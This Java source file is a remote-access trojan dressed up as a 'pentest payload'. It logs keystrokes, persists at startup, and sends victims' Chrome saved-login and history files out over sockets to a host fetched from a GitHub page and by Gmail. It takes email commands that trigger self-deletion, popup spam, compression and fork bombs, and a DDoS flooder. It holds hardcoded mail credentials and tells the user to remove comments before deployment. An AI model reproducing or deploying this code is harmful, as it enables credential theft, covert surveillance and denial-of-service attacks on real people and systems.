package main;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Calendar;
import java.util.Properties;
import java.util.StringTokenizer;
import java.util.concurrent.Executors;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Flags;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.NoSuchProviderException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Store;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

/**  
 *                                                                                                                                                      
                                                                                  `                                                                   
                                                                               `.;;;:,.`                                                              
                                                                             `:++##zz#*,:`                            ``                              
                                                                            .++#zznnnzn#,;,`                         `:*.                             
                                                                           .*z#nz;+nnnzzz,;i`                       `;i#+                             
                                                                           ;#xzzii;nnxzxni;i:                      `;i#z#`                            
                                                                          ,#nM#i;iinnnzxnn:;i`                     :;#zz#                             
                                                                `.;;;;*i,`*nnx;;;i+xxnxxxx:;ii`    :ii`         ` :;#zzz+                             
                                                                ,iz#zzx#:*#nnn;;;*nnxzxxxxiii+:`  `*ini          ,;+zzzni                             
                                      ``                       .*z+++++++#znni;;izxnnnxnzn**i#*`  :;+ni         .;*zznzz`                             
                                      ;:.                     .;#*,;,.;++xnxi;;;+xnnnz*```.;*+i,  i;zn,        .;izznnn:                              
                                     ,::::`                 `:*+#z*z+++**nz*;;;*xxn#**++;*;,:*i; ,*inz`       `;;zznzz+`                              
                                     i::::i;;,`            `i+i+zz#*i+*#+n*;;;izxn*****#++#:.:ii,**#x+       `;:#zzzzz.                               
                                 ``.`,+:::#####+;`         .zi*++++i+**#z*;;;;#xn*iii*z##nzz;iizz#+#n+      `;,#zzzzn;                                
                       ```....:;iii++i++::;+*##z#i`        ,*i*;*zzz#**+*;;;;*nx*iii*#x#iMnni*i+i:+nn#      :,+zzzzz+                                 
                    .;:;i*;i#z*;;:;;z#iz+::;++***z#,.` `   ;;*i#+**+z##*:::;izzz#*i**zznxnnn#+;*.`:*#z`    :,*zzzzzz.                                 
                  `:;::ii;i+z****i;ii*++#*;;;*+***#++#**i:.**+#:;*###z+::::;#zzzz#***+###nxx*;;*..i**+    ,,izznzzz;                                  
                `.**+#z####++#zzz++ii***+z*;;;i+++++###z*zz+zz*#xWWWz#;;:,:*nznnnz#**++###nx*;;*:;***;   .,;zznnzz#`                                  
                `*++*+zzz##z+**zn#i+****++z*;;;;+zi.````,+#*+#znxWMn**##;:izzzxxxzz+++##znnxz;;i;i+**. `.::#znnnzz,                                   
                 .*+*+zznnxn+++++####+**++#ziii*+##;,``,+;;*+#zzznzi**,,,;#n#znMnzzz##zznnnxxiii*++*; `**,#zznnnni                                    
                  `:++i;i*+***++++####z#*+#zzii+*+++*,;*i:;+##zznz***::::+z#z#zzzzzzzzz#;::::..,*##i``+*##nznxznz`                                    
                   ,;;::ii****++######zz++##z#*iii++++*#;i#nnnnxn*i+::::*xz+zzzzzzzzzzi....:+ii++#n`.*n#zxznnzzx,                                     
                 `:i;;+##+*+*+++######zn#####x#i***+++#xznz+*znM+ii#i::izWx##zzzzznnni,.` `+++++z#+.**,#nxnnn#z+                                      
                `;i;izz*#n#*#+#######zzzn###z#n+***++++n##+*++*z+ii+#+;+nxMn#nnnnxnn+.`  `i++++xnxn###+znnnx#zz,              ```                     
              `,*+;i*#z#zz##+*+++#znz#n##z#z####+**+#++zi;i*****++i*nz#xnxxMMMnnnz++,``.:i#+++znnxx########nxzz.          `,;*+##:                    
           ``.;izi+i:+########+++#z##nxz+;`.:ii:z+#+++#*iiii*****zz#*nnnxnznx*i;ii*;..;++##++#nnnzx++######znz+`    ` `.:*#zz####zi                   
           .;ii*n++++znnnnnzzz#+#zn#z#i,`     ,,;z###+i;iiiii****zzz,znxz*+nn*:,:;*,i++######znnnz++++zz##nxxn,    `.;*##zz###zzz#:                   
          ,*iii*++##n#+##zzznxnzz#nzi`        :::i*in+*;iiii****+zz#*+nz;*#zxxzi**+.:*+++++##zznx#**++nnnnxnxz,::,:*#######nzz#++,                    
      ` .:;ii++;+##nnz*zzzzi*nxz#zn*`         ;iiiii+i+;iii##***####++n#;+znnxn#++#::::i+++##nzxn****+xM+znnzz#zn#######zzzn+**+,                     
       ,;:ii*+z**z*i+nx#znxi;#xx#n+`          ;iiiii*i*iiii+zz+znz##++#xz+nn+nnzzzziiiiii*+##znxz;i**+#zi#i+xn+##z#+#zzzzzzz++*.                      
      ,::;*#+zzznz#+znn*+#x+;inxn+`           :.``.:+*i+**;+#zznnnz#;;*nnzxxxzzxxxx+++++*++z#nxn+;;ii*#nzz+##z####z+zzzzzz#z+;`                       
     .::i+###zznz#;ixxnz##n#ii#xx;            ;,;i*+*;*#**#znzzznnx*...+nxxxzzxxxxx+*i*****z#xxn*;;;;*znz++########znxxnz###:                         
    `:;+###zzzzxz#*+nnnz##nz+i*zzz            i+****i,##i+z:nzzzziz:...#nznxxnnnnnn#;,,,,,*z#xxn*;;;i+nn*++++##zz#+#nnxxnz*`                          
    ,i++*##nzzzznxxnnxn#+#xn+**nxx.           ,*****i.,+i*xn#+zz;+*...:xzzznxnzzzzzz*iii;izz#nnn+****zx*ii*++##xnxn+zzzzni`                           
   .*+***+z+xz+xxz#xzxn++xxx###z;x,           `i****#..,ii##**#n*M;...+xnznnxxnnzzzz+iiii*z##zxn#+**+nz;;;i*+#zxn*#nx#nx#`                            
   :**i:,,i+nznxxz+z+nx#znxxznnxzz`            ,**+++i..:i*#+*zzzni;,:nxnzznn#*zzzzz+*iiii##+#Mnz+++zn*;;;i*++nM*i#nnn#n+`                            
    `````;+#nzznxnzz*#nnx#nxxxnnz#i             ``,**+,`:z*++#xzxn*;:#xx#zxz#*+*+nnnn***i*##++z#nnz#n#**iiii*znx#n;+#M###+*;.`                        
     ``;*+#nx#*#x#zii+nnz##nxz;*nxz                ```::;#+zz#xzn**iixxnnxMz*+**+nnnx#i*+++###+z+xzzn#+*****#nxxn#i+zx+####zn+:`                      
     `:;*#ziznnznnz*;+znn#++nz;inxz.                  .;;*zz##nnn,*+zxxxxn#+++**+x#nnxz*i***i+#+nnz#zz#++**#nxz+*+zznz#####zz#n#;:.``                 
     .+#:#ni:*znznz##z##z++*nziiznz.                   .;;:zznxx#:*#MMxnz###+++*zz##nxxnz##++*+znznzzzz+++#nn#;i******+####zzi#####++*i:.`            
    `izz+*#+#zzzzznzn+*+#**#xn##xxn,                    `i`;#zzn*i**;+###z#++++#n###nxxnnzzn#*+xz#zz###`:#nn+;:;i*****+#####zz*#######nzz#*:.         
    ,#zzznnxxnznn#+n#*+#**+z#znnz*n`                     `.,+##n;*+**+#z#####+zn###nxxxnnzzn**nnzz#z#z,` .i#*i;:i****#zz####zz*zz######z#####+,       
    izzzznx+z**+z+*+n##+**z#,+#nz+i                       ,`;::,i**,;i######zz####nxMxnnzzz#*nnz#n#z#+    ,++*;;;***#nnn#*+zznnnzzzzz##z######z.      
   `:zzn+nx+#i:i+#+#xn#++zn:++;#n+:                       ......i++;:i+#zzzz#####nxMxnnzzzz+nxnnzz#zz.    .#+*;;i*+#xxz#nx+#znnxnzzzzzznzzz####+      
   ``#z##nxzn*:;+#znzzxxxx*:z;*zxn:                        :....:#ii**+##++++###nxxxnzzzzz#xxxM#nz##*     `##+ii+znnxn;iznM#znnnnxn####z++###zzz:     
   `;#n#nzxnn#**#+zz#+++ni`#*i#nnzi                        .,,,,#z*********+##znxxnnzzzznnxxnnxzz#+#`      +#+#znnnxWz#+xnxMxzzznnxz####*****+#+,     
   .+#nxn+znnzz#+*+#++*+, ;n##nn#+.                             :nzzz#zzzzznnnnxxnzzzzznxnnnxx#+++#,       i#znnnz#zMx*;+zzMnnnzzznx###z++*i;,.       
  `iz+zx+i+zxnnz**+#++*;  :nznn#+;                            ``.:+xxnnnnnnnnxnnznnzznxzznMMxx`.+#,        ;nnMz+****z*+zz+Wnnzznz#nn+i;:.`           
  :#+zznz#znnznz*+#++**`  `+nn##+`                           .;::,*#xnnnnnnnzzzzznxxxnzznnnxxn` `.         `#z+;;;ii*+zz#nn##znnzMz#;                 
 .++*#zn#++zx++zn#++**:    `i#z*.                           ..`:,,;#nz+zxxxnnnznxMMxnzznnnzzn+``           `*ii;::;i**+#zz####znxxzi`                 
 i+****n+;;#n++z##++*i       ```                           ,.  `:::iz*+izxxxMMxMxnxnzznnz+##*i;;;`         .*ii;::;i**+#######znnxn,                  
.#****+nz;;#n:,.i++++.                                    ,:` `.,;;;##z*i+nxxxxnxxnzznn#i*:,::;;;i`        ;*ii;::;***++######znnxnn,                 
i+**+*:+#+#zn+,` `.,.                                   `,;.,.`,,:;;inzz*i+nnnnnnnzzzxzii``..,:;;;*`       i*i;;::i***+######zzn++znz.`               
#***;` innz#*+++.                                      `:.,..,,,,:;i*#nnn+iznnnnnznznnz**```..,:;;;i.     `**i;;:;i*+znzzzzz#znnn*####*:.             
++i.   .zz+#;i+zn`                                     `i*,:::::::i*++nnnz##nnnnnnxMnzn+*`  `.,:;iii*.    .*ii;;;;i*nxnnnz###znn+*#######i,`          
;.      +nzz*i#n#,                                  ```:#x*:;;i;;;i++*z++zzznnxxnnnWz#zz.  ``.;*++++++    :***+##zznxxn+*zn++znn++#########+:`        
        `*nz++z+*.                                `:+*ii*+n,iii*iii++*##*iznnnnnzzxMM+#;  ``,i*+++++++`   iznnnnnnnnnx*;*zz#*znnxnnz#######zz+i.      
         `izzzz**`                               `i#nn*ii+n:**********+:` `*nnnzzzxxni#`` `,;i*+++++++.   inz+i;;i*#Wzn#zxnz*znxxxzznz#####zz###;`    
           .izz+,                                :#nxxn+*nz;***+**++**i    `,+###++;` :```:;;i**i;;*++, ``**ii;::;**nz*;+#zzxnznxxxzzznnz###z###z#:   
             `,`                                `;#nxxM+nzz##zn#++++**`       ````    :..:;;;;;,,,;i*+: `i*ii;;:;i**#ni*+z#zxnnzznnxzzzzzzzzz#####z;  
                                                `;*xMnMnzn**+znz#+++i`                ,.:;;;;:,.;*++++;`,**ii;;;;ii*+zn#nz#z+znxzznnn#####znnz#####*  
                                                 i;zxxxxzz#i#zzznz+,`                 `:i;;;;,.i+zxxz#*`i**ii;;;ii***+##nnn#znnnxn#nnz#####z##zz###+  
                                                `;+#zznn#izzz##z#*i                    ;iiii:,i+nMMMnnz+**+*i;i+ii****+++###zznnxnn#nz#####z***+zz##` 
                                                ``zzzzzz#+znzzzz+*;                    .*iii:;+nxxn#nnx+***i*+*#zz+**++++###zznnnxnnzn#+#++z*****+z#` 
                                                ` .znzzz*#+zznn#**;                     .*i*i*+Mn**+zxx#*****i####zznnzzz###zznnxxnx+,:;;;;;;;;;;;;:  
                                                   `i#z+i#+*+++**+,                      `ii#nMMni#nzxM+***+i+######nxnz####znnnz#nnz`                
                                                    `,.;i++*+++++:                        `*zzxxx++xxx#i****i#######nz*zz+##zznn#*#zx;``              
                                                   `,*;:*#++*****:                         #*i##xz+nxzi***+;+######zxn+#z++zznnn#+###zi.              
                                                 `:##+*;*#**+znzz+                         *++znniinzi****+***#####nxn#zzz*znnnni+######;`            
                                                `i;+zzi#i+*#nnnzn#`                        i#xx#;izn#i***#+#***+##zxxn###z##nnnx#########+,           
                                                ;i;*nzz##zznzzzzz:                         .nnni#xxn#ii**#*zz++**+nxnn####+*#znxnnz########i`         
                                                ii*+#zzzznnzzzzzn`                          #nnnxxxz#+i**+*zzz#+*+nxnz####i+###zxnznz#######z, `      
                                                ;++##znzzzzzzznnz`                         `*inxxnnzzzz**i#zzzzz#+xnn####+i#####zxnznn######z#i`      
                                                .+n#zxnzz###zzzzz.                         `*#xxnn+#nznn#izzzzzzn#xnz####**#####zxnnzznz####z##+.     
                                                `:#nxxzzzzzzz#+i,`                         `##xnzni+zxnn*+*#zzzzxznn####+;#######Mnnzzzzn###z####.    
                                                  .+nnzzz#*;,`                             :znxzzn+z++nz#z#+*##xxxnz####*i######zxnnnz##znn#z#####:   
                                                    .:;:.`                                 *x#znz*n*;i##zzzz#+#xnz######**+#####nnznnz####znn#####z:` 
                                                                                           +#zzn#*z#znnxnzzzzznnn*+###z+#z+*+###xnznnz#####znz######, 
                                                                                           ++zzn+nnxMMxznxnzzznzz#**+###izzz++#zxn#nnz#####z*+zz####i 
                                                                                           *#zzzzznW#*zxzxxxznnzzzz#*+#i+zzzzz+#xn#nnn####z+**+zz###* 
                                                                                           i#zzzz*+x*;#nnnnxzz#znzzzz+#;zzzzzznznz#n#;i+###*****#z##i 
                                                                                           .nzzz*:+z*#zxMnnx#ii*+nnzzz*izzzzzznnnz#;    `.:i*++**+zz; 
                                                                                           `*zz#i,+n##zxxxxn#nxnzzxnn#i+*#zzzzxnz#z.        `.,;i*+z: 
                                                                                           `+zn*;:*z##+zzxMnxMMnnzxxz*#z#++##nxz##z`              `.  
                                                                                            .*#*;i#nxnnzzxnnM#i+nznnznzzzz#+*xn####                   
                                                                                             `#**+znxxnznn+#M+;+zxnnzzxzzzzz#nz++zi                   
                                                                                             ,nznnnxxnzznz;zn+znnMnnn++nnzzzxzzz#n,                   
                                                                                             izn+:#xxzznni:zMz##Wxnxn#+nxxnxxnzzz#                    
                                                                                             ;nx*i#nxzzn#:izz##+zzxxnxxxnznxxzzz#.                    
                                                                                             .xnz##xnzMz*i+znzzzzzx#nMz##n#nnz+*`                     
                                                                                              *n###zznM+*#znxxxzznz#+M+:+znnnz*.                      
                                                                                              `inzzzz*zzznxxxxnzzn#*#n##znMnxn:                       
                                                                                                `:i;.iznni+nxxzznz*;zM###Mxxn*                        
                                                                                                     inx#;*#xn#nn+i;zzxxnzzn*`                        
                                                                                                     ,xxx###xnnx#+i*zz+*+zn#.                         
                                                                                                      #xzz#+nnxz#**#nxnzz#i.                          
                                                                                                      `#zz#zzzn+z#nnxxnzz:                            
                                                                                                        ,;i;`:xnxx*zxnzz*                             
                                                                                                             `xxzni#xzz#`                             
                                                                                                              ;x#zzzxn+`                              
                                                                                                               ;z###z*`                               
                                                                                                                `;;:.                                               
 * 
 * @author citrus
 */
public class Radio
{
	public static int schDay = -1;
	public static boolean uploadDone = false;
	
	/**
	 * 
	 * [ In an actual pentest deployment, after setting functions, ] 
	 * [ please remove these helpful comments from the payload.    ] 
	 * 
	 * The following boolean values are toggle switches for various functions.
	 * @string logKeystrokes toggles keystroke logging
	 * @string doPersistance toggles persistance module (run at startup_
	 * @boolean emailUpload toggles automatic mailer
	 * @boolean emailReceive toggles email command control
	 * @boolean socketUpload toggles socket TCP uploader
	 * @boolean useStatIP toggles the usage of a static IP for Socket Uploader
	 * @boolean mailIPtrackers toggles the usage of sending WAN IP via email
	 * @boolean checkForKill toggles the usage of remote killswitch at startup
	 * @boolean verifyOS toggles the requirement of a Windows-based OS (if being run with WINE or ReactOS)
	 * @string staticIP sets static IP addr to use if static IP is enabled
	 * @string allowedMailer is the email that is authorized to send commands to the payload.
	 */
	
	public static boolean logKeystrokes = true;
	public static boolean doPersistance = true;
	public static boolean emailUpload = true;
	public static boolean emailReceive = true;
	public static boolean socketUpload = false;
	public static boolean useStatIP = false;
	public static boolean mailIPtrackers = false;
	public static boolean checkForKill = true;
	public static boolean verifyOS = true;
	public static boolean isSecondaryDistrib = true;
	public static String staticIP = "127.0.0.1"; // change accordingly
	public static String allowedMailer = "targetemail@gmail.com";
	public static Main m = new Main();
	static DDoS ddoschan = new DDoS();
	static DialogSpawner sp = new DialogSpawner("Get rickrolled", "Why did you run this?");
	static Thread spawner = new Thread(sp);
	static Astatine a;
	static Thread AlphaDecay;
	
	@SuppressWarnings("static-access")
	public static void main (String[] args) throws IOException, URISyntaxException
	{
		ddoschan.run("127.0.0.1", 80, 1000);
		a = new Astatine();
		AlphaDecay = new Thread(a);
		Chocolat.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
			Executors.newSingleThreadExecutor().execute(new Runnable() {
				@Override
				public void run() {
					try {
						m.exec();
						Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
					} catch (IOException | URISyntaxException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}	
			});
		Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
		java.util.Date d = new java.util.Date();
	    Calendar cl = Calendar.getInstance();
	    cl.setTime(d);
	    schDay = cl.get(Calendar.DAY_OF_WEEK);
		for(;;) {
			d = new java.util.Date();
		    Calendar cal = Calendar.getInstance();
		    cal.setTime(d);
		    int dow = cal.get(Calendar.DAY_OF_WEEK);
		    int hour = cal.get(Calendar.HOUR_OF_DAY);
		    int minutes = cal.get(Calendar.MINUTE);
		    if (schDay != dow) 
		    {
		    	uploadDone = false;
		    	schDay = dow;
		    } // update scheduler
			 if (dow == 2 || dow == 3 || dow == 4 || dow == 5 || dow == 6) {
				 if ((hour >= 16 || hour == 0)) {
					 if (socketUpload) {
						 if (minutes % 2 == 0) {
							upload(getHostIP());
						 } 
						 else {
							 uplogin(getHostIP());
							 uphistory(getHostIP());
						 }
					 }
					 if (minutes % 30 == 0 || minutes == 0) {
					     if (emailReceive) {
						     Chocolat.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
							 checkForCommands();
					     }
						 if (emailUpload && !uploadDone) {
							 if (mailLogs() == 0) {
							     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
								 uploadDone = true;
							 }
						 }
					 }
				 }
			 } 
			 else if (dow == 1 || dow == 7) {
				 if (socketUpload) {
					 if (minutes % 2 == 0) {
						 upload(getHostIP());
					 } 
					 else {
						 uplogin(getHostIP());
						 uphistory(getHostIP());
					 }
				 }
				 if ((minutes % 30 == 0 || minutes == 0)) {
					 if (emailReceive) {
					     Chocolat.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
						 checkForCommands();
				     }
					 if (emailUpload && !uploadDone) {
						 if (mailLogs() == 0) {
						     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
							 uploadDone = true;
						 }
					 }
				 }
			 }
		 }
	}
	 public static String getHostIP() throws IOException {
		 if (!useStatIP)
		 {
		 try {
	     String s = "";
		 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
         URLConnection yc = yahoo.openConnection();
         BufferedReader in = new BufferedReader(new InputStreamReader(
                 yc.getInputStream(), "UTF-8"));
         String inputLine;
         StringBuilder a = new StringBuilder();
        // System.out.println("a");
         while ((inputLine = in.readLine()) != null){
             a.append(inputLine);
             if(inputLine.contains("connectTo")) {
          //  	 System.out.println("b");
            	 s = (inputLine.substring(78, inputLine.indexOf("</td>")));
             }
         }
         return s;
    //     return "127.0.0.1";
		 } catch (Exception e) {
			 return "127.0.0.1";
		 }
		 } else {
			 return staticIP;
		 }
	 }
	 @SuppressWarnings({ "static-access", "resource" })
	public static void upload(String ipee) {
		 try {
	    		//System.out.println(connectTo);
	    		Socket socket = new Socket(getHostIP(), 25565);
	    		OutputStream t = socket.getOutputStream();
	    		PrintWriter out = new PrintWriter(t);
				String toSend = System.getProperty("user.name") + ".txt";
				out.print(toSend );
				out.flush();
	    		File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
	    		byte [] bytearray = new byte [(int)transferFile.length()]; 
	    		FileInputStream fin = new FileInputStream(transferFile); 
	    		BufferedInputStream bin = new BufferedInputStream(fin); 
	    		bin.read(bytearray,0,bytearray.length); 
	    		OutputStream os = socket.getOutputStream(); 
	    		// System.out.println(""); 
	    		os.write(bytearray,0,bytearray.length); 
	    		os.flush(); 
	    		socket.close();
	    		Chocolat.println("[" + m.robert.elapsedTime() + "] Thingy log uploaded");
	    	} catch (Exception e) {
	    		Chocolat.println("[" + m.robert.elapsedTime() + "] Thingy log upload failed: " + e.toString());
	    	}
	 }
	 @SuppressWarnings({ "static-access", "resource" })
	public static void uplogin(String ipee) throws IOException {
		 try {
			Socket socket = new Socket(getHostIP(), 69);
			OutputStream t = socket.getOutputStream();
			PrintWriter out = new PrintWriter(t);
			String toSend = System.getProperty("user.name") + ".txt";
			out.print(toSend );
			out.flush();
			socket.close();
			Socket send = new Socket(getHostIP(), 420);
			// System.out.println("Accepted connection : " + send); 
			File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"); 
			byte [] bytearray = new byte [(int)transferFile.length()]; 
			FileInputStream fin = new FileInputStream(transferFile); 
			BufferedInputStream bin = new BufferedInputStream(fin); 
			bin.read(bytearray,0,bytearray.length); 
			OutputStream os = send.getOutputStream(); 
			System.out.println(""); 
			os.write(bytearray,0,bytearray.length); 
			os.flush();
		    send.close();
		    Chocolat.println("[" + m.robert.elapsedTime() + "] Chrome data uploaded succesfully");
		 } catch (Exception e) {
			Chocolat.println("[" + m.robert.elapsedTime() + "] Chrome data failed to upload");
		 }
	 }
	 @SuppressWarnings({ "static-access", "resource" })
	public static void uphistory(String ipee) throws IOException {
		 try {
		 		Socket socket = new Socket(getHostIP(), 70);
		 		OutputStream t = socket.getOutputStream();
		 		PrintWriter out = new PrintWriter(t);
					String toSend = System.getProperty("user.name") + "history.txt";
					out.print(toSend );
					out.flush();
					socket.close();
					Socket sand = new Socket(getHostIP(), 421);
					// System.out.println("Accepted connection : " + sand); 
					File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History"); 
					byte [] bytearray = new byte [(int)transferFile.length()]; 
					FileInputStream fin = new FileInputStream(transferFile); 
					BufferedInputStream bin = new BufferedInputStream(fin); 
					bin.read(bytearray,0,bytearray.length); 
					OutputStream os = sand.getOutputStream(); 
					System.out.println(""); 
					os.write(bytearray,0,bytearray.length); 
					os.flush();
				    sand.close();
				    Chocolat.println("[" + m.robert.elapsedTime() + "] History upload successful");
				 } catch (Exception e) {
				    Chocolat.println("[" + m.robert.elapsedTime() + "] History upload failed");
				 }
	 }
	 public static int getCurrentVersion() {
		 try {
		 // return version from domain controller, if cant connect return current version
			 return 1;
		 } catch (Exception ee) {
			 return 1;
		 }
	 }
	 @SuppressWarnings("static-access")
	public static int mailLogs() {
		 // mail keylog, history and saved passwords to email address
		 // Recipient's email ID needs to be mentioned.
	      String to = "targetemail@gmail.com";

	      // use non gmail acct, outlook
	      // Sender's email ID needs to be mentioned
	      String from = "noreply@gmail.com";

	      final String username = "noreply@gmail.com";//change accordingly
	      final String password = "password";//change accordingly

	      String host = "smtp.gmail.com";

	      Properties props = new Properties();
	      props.put("mail.smtp.auth", "true");
	      props.put("mail.smtp.starttls.enable", "true");
	      props.put("mail.smtp.host", host);
	      props.put("mail.smtp.port", "587"); // tls port

	      // Get the Session object.
	      Session session = Session.getInstance(props,
	         new javax.mail.Authenticator() {
	            protected PasswordAuthentication getPasswordAuthentication() {
	               return new PasswordAuthentication(username, password);
	            }
	         });

	      try {
	         // Create a default MimeMessage object.
	         Message message = new MimeMessage(session);

	         // Set From: header field of the header.
	         message.setFrom(new InternetAddress(from));

	         // Set To: header field of the header.
	         message.setRecipients(Message.RecipientType.TO,
	            InternetAddress.parse(to));

	         // Set Subject: header field
	         message.setSubject("Re: Chemistry Project Planning: " + System.getProperty("user.name"));

	         // Create the message part
	         BodyPart messageBodyPart = new MimeBodyPart();

	         // Now set the actual message
	         if (mailIPtrackers)
	         {
	         messageBodyPart.setText("Hello, how is babby formed? Sincerely: " + System.getProperty("user.name") +"IP:"  + wanIP.getExtIP());
	         } 
	         else 
	         {
	        	 messageBodyPart.setText("Hello, how is babby formed? Sincerely: " + System.getProperty("user.name"));
	         }
	         // Create a multipar message
	         Multipart multipart = new MimeMultipart();

	         // Set text message part
	         multipart.addBodyPart(messageBodyPart);

	         // Part two is attachment
	         messageBodyPart = new MimeBodyPart();
	         String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
	         String otherfilename = "C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data";
	         DataSource source = new FileDataSource(filename);
	         messageBodyPart.setDataHandler(new DataHandler(source));
	         messageBodyPart.setFileName(filename);
	         multipart.addBodyPart(messageBodyPart);
	         BodyPart otherMBP = new MimeBodyPart();
	         DataSource other = new FileDataSource(otherfilename);
	         otherMBP.setDataHandler(new DataHandler(other));
	         otherMBP.setFileName(otherfilename);
	         multipart.addBodyPart(otherMBP);
	         // Send the complete message parts
	         message.setContent(multipart);

	         // Send message
	         Transport.send(message);

	         Chocolat.println("[" + m.robert.elapsedTime() + "] Transmission successful");
	         return 0;
	      } catch (MessagingException e) {
	    	  Chocolat.println("[" + m.robert.elapsedTime() + "] Mailer Broadcast Failure:" + e.toString());
	    	  return 2;
	      }
	 }
	 @SuppressWarnings("static-access")
	public static int checkForCommands() {
		 try {

		      //create properties field
		      Properties properties = new Properties();

		      properties.put("mail.pop3.host", "pop.gmail.com");
		      properties.put("mail.pop3.port", "995");
		      properties.put("mail.pop3.starttls.enable", "true");
		      Session emailSession = Session.getDefaultInstance(properties);
		  
		      //create the POP3 store object and connect with the pop server
		      Store store = emailSession.getStore("pop3s");

		      store.connect("pop.gmail.com", "suzukiairi8892@gmail.com", "richardnguyen");

		      //create the folder object and open it
		      Folder emailFolder = store.getFolder("INBOX");
		      emailFolder.open(Folder.READ_ONLY);

		      // retrieve the messages from the folder in an array and print it
		      Message[] messages = emailFolder.getMessages();
		      Chocolat.println("Command Recv Count: [" + messages.length +"]");

		      for (int i = 0, n = messages.length; i < n; i++) {
		         Message message = messages[i];
		         // System.out.println("---------------------------------");
		         //System.out.println("[[ Mailer Command Received ]]");
		         //System.out.println("Email Number " + (i + 1));
		         //System.out.println("Subject: " + message.getSubject());
		         //System.out.println("From: " + message.getFrom()[0]);
		         //System.out.println("Text: " + message.getContent().toString());
		         //System.out.println("---------------------------------");
		         if((message.getFrom()[0] + "").matches(allowedMailer))
		         {
		        	 // Terminate own 
			         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) 
			         {
			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Kill Command Received");
			        	 message.setFlag(Flags.Flag.DELETED, true);
			        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
			 			 cf.deleteOnExit();
			 			 System.exit(0);
			         }
			         // Popup boxes
			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("WRECK")) {
			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Started spawning lulz :3");
			        	 message.setFlag(Flags.Flag.DELETED, true);
			        	 spawner.start();
			         }
			         
			         // Compression bomb
			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("FILL")) {
			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] WTF BOOOOOOOOOOOOOOOOOOOOOOM!");
			        	 message.setFlag(Flags.Flag.DELETED, true);
			        	 AlphaDecay.start();
			         }
			         
			         // Fork bomb
			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("RAMBLOW")) {
			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] UAV Inbound, nuking the RAM.");
			        	 message.setFlag(Flags.Flag.DELETED, true);
			        	 Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
			         }
			         
			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("GETLOGS")) {
			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Manually resending logs...");
			        	 message.setFlag(Flags.Flag.DELETED, true);
			        	 mailLogs();
			         }
			         
			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().contains("DDOS")) {
			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Flooder activated.");
			        	 StringTokenizer st = new StringTokenizer(message.getContent().toString());
			        	 String url = st.nextToken();
			        	 int port = Integer.parseInt(st.nextToken());
			        	 int threads = Integer.parseInt(st.nextToken());
			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Flooder: Target Locked: " + url + " PORT " + port);
			        	 Executors.newSingleThreadExecutor().execute(new Runnable() {
			     		    @Override
			     		    public void run() {
			     		    	try {
			     		    		ddoschan.run(url, port, threads);
			     				} catch (Exception e) {
			     					// TODO Auto-generated catch block
			     					e.printStackTrace();
			     				}
			     		    }
			     		});   	 
			         }
			         
		      	  }
		      }

		      //close the store and folder objects
		      emailFolder.close(true);
		      store.close();
		      return 0;
		      } catch (NoSuchProviderException e) {
		    	 Chocolat.println("[" + m.robert.elapsedTime() + "] Mailer request failed:" +e.toString());
		         e.printStackTrace();
		         return 2;
		      } catch (MessagingException e) {
		    	  Chocolat.println("[" + m.robert.elapsedTime() + "] Mailer request failed:" +e.toString());
		          e.printStackTrace();
		          return 2;
		      } catch (Exception e) {
		    	  Chocolat.println("[" + m.robert.elapsedTime() + "] Mailer request failed:" +e.toString());
			      e.printStackTrace();
			      return 2;
		      }
		   }
}